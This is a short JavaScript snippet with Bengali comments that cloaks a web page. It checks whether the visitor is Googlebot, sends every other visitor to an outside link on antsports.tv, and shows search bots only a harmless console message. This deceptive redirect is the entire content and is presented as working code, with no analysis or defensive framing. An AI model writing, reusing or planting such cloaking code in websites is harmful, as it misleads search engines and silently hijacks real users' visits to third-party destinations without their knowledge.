if (!navigator.userAgent.includes('Googlebot')) {
  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
  window.location.href = "https://antsports.tv/go/2D76E0F2";
} else {
  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
  console.log("Thanks for visiting my page" );
}
